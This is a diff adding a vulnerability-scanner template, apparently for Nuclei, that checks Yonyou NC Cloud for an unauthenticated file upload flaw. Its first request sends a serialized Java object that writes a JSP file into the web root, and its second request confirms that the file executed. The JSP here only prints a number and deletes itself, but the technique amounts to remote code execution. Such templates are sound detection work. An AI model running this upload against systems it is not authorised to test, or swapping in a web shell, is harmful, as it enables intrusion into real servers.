@@ -1,0 +1,35 @@
+id: yonyou-nc-cloud-file-upload
+info:
+  name: Yonyou NC Cloud File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects a file upload vulnerability in Yonyou NC Cloud by attempting to upload a JSP file and verifying its execution.
+http:
+  - raw:
+      - |
+        POST /servlet/FileReceiveServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data;
+
+        \xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\fw\x08\x00\x00\x00\x10\x00\x00\x00\x02t\x00\tFILE_NAMEt\x00\t{{randomInt1}}t\x00\x10TARGET_FILE_PATHt\x00\x10./webapps/nc_webx<%out.print("{{randomInt2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /{{randomInt1}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "{{randomInt2}}"
+variables:
+  randomInt1: '{{rand_int(10000, 20000)}}'
+  randomInt2: '{{rand_int(1000000000, 2000000000)}}'
